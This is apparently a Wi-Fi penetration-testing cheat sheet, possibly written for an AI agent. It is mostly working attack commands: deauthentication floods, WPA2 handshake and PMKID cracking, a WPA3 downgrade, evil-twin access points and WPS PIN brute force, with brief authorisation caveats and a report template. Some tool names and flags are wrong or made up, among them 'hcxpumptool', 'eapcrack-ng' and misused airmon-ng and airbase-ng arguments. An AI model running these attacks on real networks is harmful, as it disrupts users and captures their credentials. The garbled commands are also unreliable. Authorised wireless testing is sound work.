# WLAN Assessment

## Interface setup

```bash
airmon-ng check kill
airmon-ng start wlan0
iwconfig                 # confirm monitor mode
airodump-ng wlan0mon     # enumerate
```

Keep a note of your own MAC — some clients will not associate with a randomised one.

## Enumeration

```bash
airodump-ng wlan0mon
# ESSID / BSSID / channel / encryption / signal / vendor
```

| Field | Why it matters |
|---|---|
| Encryption | WEP / WPA / WPA2 / WPA3 / open |
| Signal | a strong signal from an unexpected place |
| Vendor OUI | a device that does not belong |
| Hidden SSID | typically an ad-hoc or a guest network |
| Channel spread | many APs on one channel = same physical area |

```bash
# better client-side inventory
airodump-ng --bssid <BSSID> -w /tmp/opencode/handshake.cap wlan0mon
```

## WPA2 handshake capture

The 4-way handshake is what a PSK is cracked against.

```bash
# targeted capture (only your target BSSID)
airodump-ng -c <CH> --bssid <BSSID> -w handshake wlan0mon

# force a reauthentication (deauth — impacts the target briefly)
aireplay-ng -0 5 -a <BSSID> -h <CLIENT_MAC> wlan0mon
```

Force only if the target client is in scope and the operator has authorised the disruption. Say what
you did.

## Cracking

```bash
# WPA2 PSK -> PMK
aircrack-ng -w rockyou.txt -b 00:11:22:33:44:55 handshake.cap
# or GPU
hashcat -m 22000 hashcat.hc22000 rockyou.txt
# convert cap -> hc22000 first
hcxpcapngtool -o hashcat.hc22000 handshake.cap
```

## PMKID (no client needed)

```bash
hcxpumptool -i wlan0mon -w pmkid.txt -p <BSSID>
hashcat -m 22000 pmkid.txt rockyou.txt
```

PMKID works against a modern AP with no client associated — it is a passive, low-impact attack.
Always try it before anything disruptive.

## WPA3 (SAE)

```bash
hcxpumptool --sae -i wlan0mon -w sae.txt
```

WPA3 resists the offline handshake attack. The realistic attack is a **downgrade**: check whether the
AP still accepts WPA2 associations (`PMF` optional mode), which reopens the handshake attack.

## WPA2 Enterprise (802.1X)

| Check | Tool |
|---|---|
| Rogue AP with a different RADIUS | `aircrack-ng`, EAPOL capture |
| EAPOL hash extraction | `eapcrack-ng`, `hashcat -m 5500` |
| Certificate validation disabled | the AP accepts any server cert |
| Identity confusion (PEAP without server validation) | the classic evil twin |

PEAP without server certificate validation is the most common enterprise WLAN flaw: it allows a
rogue AP to proxy the authentication and capture the inner credentials (MSCHAPv2 → crackable).

## Evil twin

```bash
# hostapd with a clone of the target SSID
airbase-ng -a wlan0mon --essid "TargetSSID" -c <CH>
# or
hostapd /tmp/opencode/hostapd.conf
```

Only test against your own network. An evil twin is a MITM position: it can capture the real
client's handshake and proxy traffic.

## Rogue AP hunting (defensive view)

```bash
airmon-ng wlan0mon
# compare the observed BSSIDs against the inventory
# watch for: unknown OUI, a duplicate SSID with a different BSSID, a strong signal indoors
```

## 802.11 protocol issues

| Issue | Test |
|---|---|
| WEP | crack with `aircrack-ng` (PTW) |
| TKIP (WPA1) | MIC attacks |
| WPS PIN | `reaver` / `wpsPin.py` against an authorised target |
| PMF disabled | downgrade to WPA2 |
| Hidden SSID | not a control |
| MAC filtering | trivially spoofed |
| Shared-key authentication | crackable with `aircrack-ng` |

```bash
reaver -i wlan0mon -b <BSSID> -p <pin>   # WPS
```

## WiFi survey tools

```bash
# bettercap capabilities
bettercap -eval "net.recon on" -eval "net.probe on"
# hotspot / deauth demos
bettercap -eval "wifi.show"
```

## Device fingerprinting from the air

Passive probes reveal: device vendor, supported rates, the device's own probe requests (which
often contain its name), and the fact that a device is present at all.

```bash
# tshark on a capture
tshark -r capture.cap -Y "wlan.fc.type_subtype==0x4" -T fields -e wlan.sa -e wlan.ssid
```

## Reporting

```
SSID/BSSID:  <network>
SECURITY:    <WPA2-PSK/Enterprise, PMF status>
FINDING:     <weak PSK | PMKID | evil twin feasible | WPS | open |
              PEAP without server validation>
EVIDENCE:    <capture path, crack result, or configuration proof>
IMPACT:      <what an attacker on the same radio gets>
SCOPE NOTE:  <what you transmitted, if anything>
```
